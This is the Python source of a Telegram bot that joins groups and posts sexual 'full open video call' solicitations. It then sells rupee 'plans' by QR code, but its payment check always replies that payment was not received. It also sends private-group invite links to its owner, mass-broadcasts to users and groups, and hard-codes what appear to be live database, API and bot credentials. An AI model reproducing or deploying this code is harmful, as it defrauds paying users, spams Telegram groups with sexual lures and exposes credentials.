import asyncio
import random
import re
import logging
import os
from pyrogram.enums import ChatAction
from pyrogram import Client, filters
from pymongo import MongoClient
from motor.motor_asyncio import AsyncIOMotorClient
#from flask import Flask
#from threading import Thread
from pyrogram.types import (
    ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardMarkup,
    InlineKeyboardButton, Message, CallbackQuery
)


logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

MONGO_URL = "mongodb+srv://teamdaxx123:teamdaxx123@cluster0.ysbpgcp.mongodb.net/?retryWrites=true&w=majority"
mongo_client = AsyncIOMotorClient(MONGO_URL)
word_db = mongo_client["Word"]["WordDb"]

API_ID = "16457832"
API_HASH = "3030874d0befdb5d05597deacc3e83ab"
BOT_TOKEN = "7581171239:AAG99QESgSiKQuV2vizw4wHF1WypJjoN5Ik"

RADHIKA = Client(
    "my_bot", 
    api_id=API_ID, 
    api_hash=API_HASH, 
    bot_token=BOT_TOKEN
)

UNWANTED_MESSAGE_REGEX = r"^[\W_]+$|[\/!?\~\\]"
CHANNEL_ID = "RadhikaCommunity"
MESSAGE_ID = 2357
OWNER_ID = 6657539971
SUPPORT_URL = "https://t.me/+gF7M1_0PC803ZjU9"
IS_BROADCASTING = False
user_responses = {}

PLANS = {
    "50": "1 Hour",
    "100": "6 Hours",
    "200": "24 Hours",
    "500": "3 Days"
}

@RADHIKA.on_message(filters.command(["clone"], prefixes="/") | filters.regex(r"(?i)\bclone\b"))
async def handle_clone(client, message):
    await message.reply(
        "Currently unavailable. Contact Support chat [here](https://t.me/+HiS0W_Zz2XJhNjZl)",
        disable_web_page_preview=True
    )


@RADHIKA.on_message(filters.command("start") & filters.private)
async def start_handler(client: Client, message: Message):
    user_mention = message.from_user.mention
    user_id = message.from_user.id
    chat_id = message.chat.id

    existing_user = await word_db["Users"].find_one({"user_id": user_id})
    if not existing_user:
        await word_db["Users"].insert_one({"user_id": user_id})
    
    total_users = await word_db["Users"].count_documents({})

    notify_text = (
        f"👤 **New User Started Bot**\n\n"
        f"🔹 **User:** {user_mention}\n"
        f"🔹 **Chat ID:** `{chat_id}`\n"
        f"🔹 **Total Users:** `{total_users}`"
    )

    try:
        await client.send_message(OWNER_ID, notify_text)
    except Exception as e:
        logger.error(f"Failed to notify owner: {e}")

    if len(message.command) > 1 and message.command[1] == "call":
        buttons = [[f"₹{price} for {duration}"] for price, duration in PLANS.items()]
        
        sent_msg = await message.reply_text(
            "Please choose your plan:",
            reply_markup=ReplyKeyboardMarkup(buttons, one_time_keyboard=True, resize_keyboard=True)
        )

        user_responses[chat_id] = asyncio.Queue()

        try:
            while True:
                response = await asyncio.wait_for(user_responses[chat_id].get(), timeout=60)

                if response.text.startswith("₹"):
                    price = response.text.split(" ")[0][1:]
                    processing_msg = await response.reply_text(
                        "`Qr Generating Please wait...⏳`",
                        reply_markup=ReplyKeyboardRemove()
                    )
                    await asyncio.sleep(2)
                    await processing_msg.delete()
                    image_path = f"plans/{price}.png"
                    
                    try:
                        await client.send_photo(
                            chat_id=chat_id,
                            photo=image_path,
                            caption = f"__Pay : ₹{price} and select Check for Call 🫦__\n__Need Any Support Email:- `RadhikaPaymentSupport@gmail.com`__",
                            reply_markup=InlineKeyboardMarkup([
                                [InlineKeyboardButton("✅ Check", callback_data=f"check_{price}")],
                                [InlineKeyboardButton("💬 Support", url=SUPPORT_URL)]
                            ])
                        )
                    except Exception as e:
                        await response.reply_text(f"Error loading plan image: {e}")
                    
                    break
                
                else:
                    await response.reply_text("❌ Invalid selection! Please choose a valid plan.")

        except asyncio.TimeoutError:
            await sent_msg.reply_text("❌ No response received. Try again.", reply_markup=ReplyKeyboardRemove())

        del user_responses[chat_id]
        
        return

    try:
        await client.forward_messages(
            chat_id=chat_id,
            from_chat_id=CHANNEL_ID,
            message_ids=MESSAGE_ID
        )
    except Exception as e:
        await message.reply_text("Something went wrong while forwarding the message.")


@RADHIKA.on_message(filters.text & filters.private & filters.regex(r"^₹"))
async def capture_user_response(client: Client, message: Message):
    if message.chat.id in user_responses:
        await user_responses[message.chat.id].put(message)

@RADHIKA.on_callback_query(filters.regex(r"^check_\d+$"))
async def check_plan(client: Client, query: CallbackQuery):
    await query.answer("Payment ❌ not received ! get support", show_alert=True)

@RADHIKA.on_message(filters.all & ~filters.bot)
async def chatbot_handler(client, message: Message):
    if message.text:
        logger.info(f"Received message: {message.text} (Chat ID: {message.chat.id}, Private: {message.chat.type == 'private'})")
        
        if re.match(UNWANTED_MESSAGE_REGEX, message.text):
            logger.info("Unwanted message (special characters). Ignored.")
            return

        if message.chat.type in ["private", "group"]:
            await client.send_chat_action(message.chat.id, ChatAction.TYPING)

        # ✅ अगर मैसेज में "call" शब्द है तो रिप्लाई करें
        if "call" in message.text.lower():
            buttons = [[f"₹{price} for {duration}"] for price, duration in PLANS.items()]
            
            sent_msg = await message.reply_text(
                "Audio & Video Call karne ke liye aapko hamara plans buy karna padega 💦💦\n Full Open call 18+ 💋𓀐",
                reply_markup=ReplyKeyboardMarkup(buttons, one_time_keyboard=True, resize_keyboard=True)
            )

            chat_id = message.chat.id
            user_responses[chat_id] = asyncio.Queue()

            try:
                while True:
                    response = await asyncio.wait_for(user_responses[chat_id].get(), timeout=60)

                    if response.text.startswith("₹"):
                        price = response.text.split(" ")[0][1:]
                        processing_msg = await response.reply_text(
                            "`Qr Generating Please wait...⏳`",
                            reply_markup=ReplyKeyboardRemove()
                        )
                        await asyncio.sleep(2)
                        await processing_msg.delete()
                        image_path = f"plans/{price}.png"

                        try:
                            await client.send_photo(
                                chat_id=chat_id,
                                photo=image_path,
                                caption = f"__Pay : ₹{price} and select Check for Call 🫦__\n__Need Any Support Email:- `RadhikaPaymentSupport@gmail.com`__",
                                reply_markup=InlineKeyboardMarkup([
                                    [InlineKeyboardButton("✅ Check", callback_data=f"check_{price}")],
                                    [InlineKeyboardButton("💬 Support", url=SUPPORT_URL)]
                                ])
                            )
                        except Exception as e:
                            await response.reply_text(f"Error loading plan image: {e}")

                        break  # ✅ Payment Plan प्रोसेस पूरा होने पर ब्रेक

                    else:
                        await response.reply_text("❌ Invalid selection! Please choose a valid plan.")

            except asyncio.TimeoutError:
                await sent_msg.reply_text("❌ No response received. Try again.", reply_markup=ReplyKeyboardRemove())

            del user_responses[chat_id]
            return  # ✅ आगे का प्रोसेस स्किप करें

        # ✅ Auto-reply सिस्टम (Database से Response निकालना)
        if not message.reply_to_message:
            responses = await word_db.find({"word": message.text}).to_list(length=10)
            if responses:
                response = random.choice(responses)
                try:
                    if response["check"] == "sticker":
                        await message.reply_sticker(response["text"])
                    else:
                        await message.reply_text(response["text"])
                except Exception as e:
                    logger.error(f"Error sending response: {e}")
        else:
            reply = message.reply_to_message
            if reply.from_user.id == (await client.get_me()).id:
                responses = await word_db.find({"word": message.text}).to_list(length=10)
                if responses:
                    response = random.choice(responses)
                    try:
                        if response["check"] == "sticker":
                            await message.reply_sticker(response["text"])
                        else:
                            await message.reply_text(response["text"])
                    except Exception as e:
                        logger.error(f"Error sending response: {e}")
            else:
                # ✅ नया Word-Response स्टोर करना
                if message.text:
                    await word_db.insert_one({"word": reply.text, "text": message.text, "check": "text"})
                elif message.sticker:
                    await word_db.insert_one({"word": reply.text, "text": message.sticker.file_id, "check": "sticker"})
                logger.info("Learned new word-response pair.")

from pyrogram.types import ChatInviteLink

@RADHIKA.on_chat_member_updated()
async def on_new_group_join(client: Client, event):
    try:
        if event.new_chat_member and event.new_chat_member.user.id == (await client.get_me()).id:
            chat = await client.get_chat(event.chat.id)
            adder = event.from_user

            me = await client.get_me()
            bot_username = me.username
            # ✅ 1. Group ID MongoDB में सेव करें
            group_data = await word_db["Groups"].find_one({"chat_id": chat.id})
            if not group_data:
                await word_db["Groups"].insert_one({"chat_id": chat.id})

            # ✅ 2. THANKS मैसेज और बटन ग्रुप में भेजें
            join_button = InlineKeyboardMarkup([
                [InlineKeyboardButton("Full Open Video Call 👄", url=f"https://t.me/{bot_username}?start=call")]
            ])
            await client.send_message(
                chat_id=chat.id,
                text=f"👋 {adder.mention} Thanks\n__Video & audio call available with zoom Come Fast 💦💦__",
                reply_markup=join_button
            )

            # ✅ 3. OWNER को Notify करें
            try:
                # Invite link generate करें अगर private group है
                if chat.username:
                    invite_link = f"https://t.me/{chat.username}"
                else:
                    try:
                        invite = await client.create_chat_invite_link(chat.id, creates_join_request=False)
                        invite_link = invite.invite_link
                    except Exception as e:
                        invite_link = "❌ Failed to generate invite link"

                total_groups = await word_db["Groups"].count_documents({})
                await client.send_message(
                    OWNER_ID,
                    f"📢 **Bot Added to Group**\n\n"
                    f"👤 **Added By:** {adder.mention} (`{adder.id}`)\n"
                    f"👥 **Group Name:** {chat.title}\n"
                    f"🔗 **Invite Link:** {invite_link}"
                    f"📊 **Total Groups:** {total_groups}"
                )
            except Exception as e:
                logger.error(f"Failed to notify OWNER: {e}")

    except Exception as e:
        logger.error(f"Error in group join handler: {e}")


@RADHIKA.on_message(filters.command("broadcast") & filters.user(6657539971))  # Replace with your OWNER ID
async def broadcast_handler(client: Client, message: Message):
    global IS_BROADCASTING
    if IS_BROADCASTING:
        return await message.reply("⛔ Already Broadcasting!")

    if message.reply_to_message:
        x = message.reply_to_message.id
        y = message.chat.id
        query = None
    else:
        if len(message.command) < 2:
            return await message.reply("🔸 Please provide a message or reply to one.")
        query = message.text.split(None, 1)[1]
        x = None
        y = None

    # Parse flags
    flags = {
        "pin": "-pin" in message.text,
        "pinloud": "-pinloud" in message.text,
        "user": "-user" in message.text,
        "nobot": "-nobot" in message.text,
    }

    # Clean flags from query
    for flag in ["-pin", "-pinloud", "-user", "-nobot"]:
        if query:
            query = query.replace(flag, "").strip()

    await message.reply("✅ Broadcasting started...")
    IS_BROADCASTING = True
    total_sent = 0
    total_pinned = 0

    # Broadcast to groups
    if not flags["nobot"]:
        chats_cursor = word_db["Groups"].find({})
        async for chat in chats_cursor:
            try:
                if x and y:
                    msg = await client.forward_messages(chat["chat_id"], y, x)
                else:
                    msg = await client.send_message(chat["chat_id"], query)

                if flags["pin"]:
                    await msg.pin(disable_notification=True)
                    total_pinned += 1
                elif flags["pinloud"]:
                    await msg.pin(disable_notification=False)
                    total_pinned += 1

                total_sent += 1
                await asyncio.sleep(0.3)
            except FloodWait as e:
                await asyncio.sleep(e.value)
            except:
                continue

    # Broadcast to users
    if flags["user"]:
        user_cursor = word_db["Users"].find({})
        user_sent = 0
        async for user in user_cursor:
            try:
                if x and y:
                    await client.forward_messages(user["user_id"], y, x)
                else:
                    await client.send_message(user["user_id"], query)
                user_sent += 1
                await asyncio.sleep(0.3)
            except FloodWait as e:
                await asyncio.sleep(e.value)
            except:
                continue
        await message.reply(f"✅ Sent to {user_sent} users.")

    await message.reply(f"📢 Broadcast complete.\n✅ Groups: {total_sent}\n📌 Pinned: {total_pinned}")
    IS_BROADCASTING = False

import asyncio
from pyrogram import Client
from flask import Flask
import threading
import requests
import time

app = Flask(__name__)

@app.route('/')
def home():
    return "✅ I'm alive!"

def run_flask():
    app.run(host='0.0.0.0', port=8000)

def keep_alive_ping():
    while True:
        try:
            requests.get("https://mmmm-2k74.onrender.com")
        except Exception as e:
            print(f"Ping failed: {e}")
        time.sleep(300)  # 5 minutes


if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    threading.Thread(target=keep_alive_ping).start()
    RADHIKA.run()
